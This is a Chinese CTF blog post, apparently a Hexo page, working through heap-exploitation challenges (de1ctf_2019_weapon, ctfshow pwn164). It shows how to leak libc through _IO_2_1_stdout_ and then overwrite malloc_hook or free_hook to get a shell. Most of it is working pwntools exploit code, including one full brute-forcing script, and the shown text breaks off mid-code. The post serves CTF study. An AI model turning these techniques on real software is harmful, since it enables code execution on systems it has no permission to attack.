@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Keep Team">
+    
+    <title>
+        
+            _IO_2_1_stdout泄露libc专题练习 |
+        
+        Keep Theme
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Keep Theme","author":"Keep Team","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Keep Theme
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        _IO_2_1_stdout泄露libc专题练习
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Keep Team</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-03-08 17:17:58</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Mar 30 2026 17:27:15 GMT+0800">2026-03-30 17:27:15</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/pwn-study/">pwn_study</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/IO-FILE%E5%88%A9%E7%94%A8/">IO_FILE利用</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="泄露原理"><a href="#泄露原理" class="headerlink" title="泄露原理"></a>泄露原理</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/113845320" >hollk师傅的源码分析<i class="fas fa-external-link-alt"></i></a></p>
+<p>泄露原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">puts / printf</span><br><span class="line">        ↓</span><br><span class="line">_IO_new_file_xsputn</span><br><span class="line">        ↓</span><br><span class="line">_IO_OVERFLOW</span><br><span class="line">        ↓</span><br><span class="line">_IO_new_file_overflow</span><br><span class="line">        ↓</span><br><span class="line">_IO_do_write</span><br><span class="line">        ↓</span><br><span class="line">_IO_SYSWRITE</span><br><span class="line">        ↓</span><br><span class="line">write(1, leak_addr, size)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a>de1ctf_2019_weapon</h3><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#de1ctf_2019_weapon" >https://buuoj.cn/challenges#de1ctf_2019_weapon<i class="fas fa-external-link-alt"></i></a></p>
+<p>伪造fd和size拿到这个位置的chunk</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310092650264.png" ></p>
+<p>然后通过该chunk，把chunk2的size改为0xd1,覆盖下面两个chunk</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310093148085.png"  alt="image-20260310093148085"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(0x50, 0, b&quot;a&quot;)</span><br><span class="line">add(0x50, 1, b&quot;a&quot; * 0x40 + p64(0) + p64(0x6f))</span><br><span class="line">add(0x50, 2, b&quot;a&quot;)</span><br><span class="line">add(0x60, 3, b&quot;a&quot;)</span><br><span class="line">add(0x50, 4, b&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x50, 0, b&quot;\xb0&quot;)</span><br><span class="line"># dbg()</span><br><span class="line">add(0x50, 1, b&quot;a&quot;)</span><br><span class="line">add(0x50, 0, b&quot;a&quot;)</span><br><span class="line">add(0x50, 7, p64(0) + p64(0xd1))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后把chunk23依次free，放入unsorted bin和fast bin，由于chunk2包含chunk3，可以通过malloc unsored 让chunk3的fd变为main_arena</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310093425342.png"  alt="image-20260310093425342"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">add(0x50, 8, b&quot;a&quot;)</span><br><span class="line">add(0x50, 9, b&quot;a&quot;)</span><br><span class="line">add(0x50, 10, b&quot;a&quot;)</span><br><span class="line"># dbg()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>之后依旧double free ，把chunk3的fd划为可覆盖的范围内，改fd到_IO_2_1_stdout_附近，根据不同去覆盖后几位，然后修改stdout</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310094600126.png"  alt="image-20260310094600126"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">free(2)</span><br><span class="line">free(4)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">add(0x50, 2, b&quot;\x10&quot;)</span><br><span class="line">add(0x50, 4, b&quot;aaa&quot;)</span><br><span class="line">add(0x50, 2, b&quot;a&quot; * 0x48 + p64(0x61))</span><br><span class="line">add(0x50, 11, p64(0) + p64(0x71) + b&quot;\xdd\x75&quot;)</span><br><span class="line">add(0x60, 3, b&quot;a&quot;)</span><br><span class="line">add(0x60, 12, b&quot;a&quot; * 0x33 + p64(0xfbad1800) + p64(0) * 3 + b&quot;\x00&quot;)</span><br><span class="line"># dbg()</span><br><span class="line">libc_base = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 0x3c5600</span><br><span class="line">if libc_base == 0x7f0000000000:</span><br><span class="line">    exit(-1)</span><br><span class="line">print(hex(libc_base))</span><br></pre></td></tr></table></figure>
+
+<p>之后就是覆盖malloc_hook了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">one_gadget = libc_base + one[2]</span><br><span class="line">print(&#x27;one_gadget --&gt; &#x27; + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">add(0x60, 13, b&#x27;a&#x27;)</span><br><span class="line">add(0x60, 14, b&#x27;a&#x27;)</span><br><span class="line">add(0x60, 15, b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">free(13)</span><br><span class="line">free(14)</span><br><span class="line">free(13)</span><br><span class="line"></span><br><span class="line">add(0x60, 13, p64(malloc_hook - 0x23))</span><br><span class="line">add(0x60, 14, b&#x27;a&#x27;)</span><br><span class="line">add(0x60, 13, b&#x27;a&#x27;)</span><br><span class="line">add(0x60, 16, b&#x27;a&#x27; * 0x13 + p64(one_gadget))</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&#x27;./de1ctf_2019_weapon&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./de1ctf_2019_weapon&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def launch_gdb():</span><br><span class="line">    context.terminal = [&#x27;xfce4-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">    gdb.attach(proc.pidof(p)[0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, index, content):</span><br><span class="line">    p.sendlineafter(&#x27;choice &gt;&gt; &#x27;, &#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;wlecome input your size of weapon: &#x27;, str(size))</span><br><span class="line">    p.sendlineafter(&#x27;input index:&#x27;, str(index))</span><br><span class="line">    p.sendafter(&#x27;input your name:&#x27;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    p.sendlineafter(&#x27;choice &gt;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;idx: &#x27;, str(index))</span><br><span class="line">    p.sendafter(&#x27;content: &#x27;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(&#x27;choice &gt;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;idx :&#x27;, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    add(0x50, 0, b&quot;a&quot;)</span><br><span class="line">    add(0x50, 1, b&quot;a&quot; * 0x40 + p64(0) + p64(0x6f))</span><br><span class="line">    add(0x50, 2, b&quot;a&quot;)</span><br><span class="line">    add(0x60, 3, b&quot;a&quot;)</span><br><span class="line">    add(0x50, 4, b&#x27;aaaa&#x27;)</span><br><span class="line">    add(0x60, 5, b&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">    free(0)</span><br><span class="line">    free(1)</span><br><span class="line">    free(0)</span><br><span class="line">    # launch_gdb()</span><br><span class="line"></span><br><span class="line">    add(0x50, 0, b&quot;\xb0&quot;)</span><br><span class="line">    add(0x50, 1, b&quot;a&quot;)</span><br><span class="line">    add(0x50, 0, b&quot;a&quot;)</span><br><span class="line">    add(0x50, 7, p64(0) + p64(0xd1))</span><br><span class="line"></span><br><span class="line">    free(2)</span><br><span class="line">    free(3)</span><br><span class="line">    add(0x50, 8, b&quot;a&quot;)</span><br><span class="line">    add(0x50, 9, b&quot;a&quot;)</span><br><span class="line">    add(0x50, 10, b&quot;a&quot;)</span><br><span class="line">    # launch_gdb()</span><br><span class="line"></span><br><span class="line">    free(2)</span><br><span class="line">    free(4)</span><br><span class="line">    free(2)</span><br><span class="line">    # launch_gdb()</span><br><span class="line"></span><br><span class="line">    add(0x50, 2, b&quot;\x10&quot;)</span><br><span class="line">    add(0x50, 4, b&quot;aaa&quot;)</span><br><span class="line">    add(0x50, 2, b&quot;a&quot; * 0x48 + p64(0x61))</span><br><span class="line">    add(0x50, 11, p64(0) + p64(0x71) + b&quot;\xdd\x75&quot;)</span><br><span class="line">    add(0x60, 3, b&quot;a&quot;)</span><br><span class="line">    add(0x60, 12, b&quot;a&quot; * 0x33 + p64(0xfbad1800) + p64(0) * 3 + b&quot;\x00&quot;)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 0x3c5600</span><br><span class="line">    if libc_base == -0x3c5600:</span><br><span class="line">        exit(-1)</span><br><span class="line"></span><br><span class="line">    print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">    malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">    one_gadget = libc_base + one[2]</span><br><span class="line">    print(&#x27;one_gadget --&gt; &#x27; + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">    add(0x60, 13, b&#x27;a&#x27;)</span><br><span class="line">    add(0x60, 14, b&#x27;a&#x27;)</span><br><span class="line">    add(0x60, 15, b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    free(13)</span><br><span class="line">    free(14)</span><br><span class="line">    free(13)</span><br><span class="line"></span><br><span class="line">    add(0x60, 13, p64(malloc_hook - 0x23))</span><br><span class="line">    add(0x60, 14, b&#x27;a&#x27;)</span><br><span class="line">    add(0x60, 13, b&#x27;a&#x27;)</span><br><span class="line">    add(0x60, 16, b&#x27;a&#x27; * 0x13 + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    free(0)</span><br><span class="line">    free(0)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    p = process(&#x27;./de1ctf_2019_weapon&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        pwn()</span><br><span class="line">    except:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="ctfshow-pwn164"><a href="#ctfshow-pwn164" class="headerlink" title="ctfshow pwn164"></a>ctfshow pwn164</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170404716.png"  alt="image-20260330170404716"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170235538.png"  alt="image-20260330170235538"></p>
+<p>delete函数中有一个uaf漏洞</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170312293.png" ></p>
+<p>清空ptr指针</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170334137.png"  alt="image-20260330170334137"></p>
+<p>realloc chunk</p>
+<blockquote>
+<p><strong><code>realloc(ptr, size)</code> 的关键逻辑</strong></p>
+<p>这行代码是整道题的核心。由于 <code>ptr</code> 是全局的，每次调用 <code>add</code> 都会发生以下三种情况之一：</p>
+<ul>
+<li><strong>情况 A：首次调用 (<code>ptr</code> 初始为 0)</strong> <code>realloc(0, size)</code> 的行为等同于 <code>malloc(size)</code>。它申请一块内存，并将地址存入全局变量 <code>ptr</code>。</li>
+<li><strong>情况 B：扩容&#x2F;缩容 (<code>ptr</code> 已有地址，<code>size &gt; 0</code>)</strong> <code>realloc</code> 会尝试在原地调整 <code>ptr</code> 指向的块大小。如果原地空间不够，它会开辟新块、拷贝原数据、<strong>释放（free）旧块</strong>，最后把新地址覆盖回 <code>ptr</code>。</li>
+<li><strong>情况 C：释放内存 (<code>ptr</code> 已有地址，<code>size == 0</code>)</strong> <strong>这是这道题最关键的漏洞点</strong>。根据 <code>realloc</code> 的标准，<code>realloc(ptr, 0)</code> 等同于执行 <code>free(ptr)</code>，并且会返回 <code>NULL</code> (0)。 由于代码里有 <code>ptr = realloc(ptr, size)</code>，执行完后全局变量 <code>ptr</code> 会被赋值为 <code>0</code>。</li>
+</ul>
+</blockquote>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>由于没有show函数，还是要通过stdout去泄露libc,这里用到了ralloc会在原地拓展的属性，拿到目标chunk的上一个chunk去calloc一个大的size去覆盖main_arena的低2个字节进行爆破</p>
+<p>先摆好tar和tar_pre两个chunk的位置</p>
+<p>然后通过7次free把tcache bin塞满（2.27的tcache没有引入key,可以随便free），并且把tar_chunk free掉准备main_arena</p>
+<p>接着拿tar_pre的地址，用这个地址去拓展，造成堆块重叠去改main_arena的后几位去爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(0x70,b&quot;a&quot;)</span><br><span class="line">add(0,&quot;&quot;)</span><br><span class="line">add(0x100,b&quot;a&quot;)</span><br><span class="line">add(0,b&quot;&quot;)</span><br><span class="line">add(0x20,b&quot;a&quot;)</span><br><span class="line">add(0,b&quot;&quot;)</span><br><span class="line"></span><br><span class="line">add(0x100,b&quot;a&quot;)</span><br><span class="line">for i in range(7):</span><br><span class="line">    delete()</span><br><span class="line">add(0,&quot;&quot;)</span><br><span class="line">add(0x70,b&quot;A&quot;)</span><br><span class="line">add(0x180,b&quot;a&quot;*0x78+p64(0x101)+b&quot;\x2d\xc7&quot;)</span><br><span class="line">add(0,&quot;&quot;)</span><br><span class="line">add(0x100,b&quot;a&quot;)</span><br><span class="line">add(0,&quot;&quot;)</span><br><span class="line"></span><br><span class="line">add(0x100,b&quot;a&quot;*0x33+p64(0xfbad1887) + p64(0)*3 + p8(0x58))</span><br><span class="line">libc_base = u64(p.recvuntil(b&quot;\x7f&quot;, timeout=0.1)[-6:].ljust(8, b&#x27;\x00&#x27;))-0x3ec758</span><br><span class="line">if libc_base ==-0x3ec758:</span><br><span class="line">    exit(-1)</span><br><span class="line">    </span><br><span class="line">print(hex(libc_base))</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330171801225.png"  alt="image-20260330171801225"></p>
+<p>这里不能用<code>sudo sysctl -w kernel.randomize_va_space=0</code></p>
+<p>因为他这个偏移比较奇怪会导致_IO_2_1_stdout_和main_arena不是在同一个0x10000上，无法通过覆盖后两位过去</p>
+<p>拿到libc之后就可以通过同样的办法覆盖free_hook</p>
+<p>这里因为ralloc返回的地址是free函数的参数</p>
+<p>所以我们可以改fd为free_hook-8,然后覆盖b”&#x2F;bin&#x2F;sh\x00”+p64(system)</p>
+<p>让realloc之后的参数为binsh的地址，并且把free_hook改为system函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">free= libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    one_gadget = libc_base + 0x4f322</span><br><span class="line">    zero()</span><br><span class="line">    add(0x110,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line">    add(0x20,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        delete()</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x110,b&quot;A&quot;)</span><br><span class="line">    add(0x180,b&quot;a&quot;*0x118+p64(0x121)+p64(free-8))</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    